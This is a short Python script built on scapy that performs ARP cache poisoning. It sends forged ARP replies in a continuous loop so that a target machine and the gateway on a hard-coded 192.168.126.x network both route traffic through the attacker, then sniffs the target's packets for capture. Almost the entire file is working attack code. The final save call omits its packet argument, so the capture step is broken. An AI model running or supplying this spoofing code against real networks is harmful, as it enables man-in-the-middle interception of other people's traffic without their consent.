#!/usr/bin/python3
# -*- coding:utf-8 -*-
# Author: Weize
# Software: PyCharm
# Filename: fackarp.py
# Date: 2019/11/7

from scapy.all import *
import sys,re, time
from threading import Thread

stdout = sys.stdout

target_ip = '192.168.126.130'
#伪造网关地址
gateway_ip = '192.168.126.2'
my_ip = '192.168.126.129'
#伪造网关mac
gateway_mac = '00:50:56:EC:FE:6C'

my_mac = '00:0C:29:DD:B7:E1'

# noinspection PyUnresolvedReferences

def arp_poision_thread(host_ip):
    host_ip = dict(host_ip)
    while True:
        for i in host_ip:
            arp_hack(hw = i, ip = host_ip[i])

def arp_hack(ip, hw):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = ip
    poison_target.hwdst = hw

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    #ls(poison_target)
    send(poison_target)
    send(poison_gateway)

    time.sleep(1)


def get_host():
    hw_ip = {}
    sys.stdout = open('host.info', 'w')
    arping(target_ip)
    sys.stdout = stdout
    f = open('host.info','r')
    info = f.readlines()
    f.close()
    del info[0:4]

    for host in info:
        tem = re.split(r'\s+',host)
        if len(tem) > 3 and len(tem) < 5:
            hw_ip[tem[1]] = tem[2]

    return hw_ip

if __name__=="__main__":
    host_ip = get_host()

    ap_thread = Thread(target=arp_poision_thread, kwargs={'host_ip':host_ip})
    ap_thread.start()

    try:
        print("[*]Start sniffer pickets")
        bpf_filter = "ip host %s" % (target_ip)
        packets = sniff(count = 100, filter = bpf_filter, iface = None)
        wrpcap('arppoison.pcap')

    except KeyboardInterrupt:
        sys.exit(0)




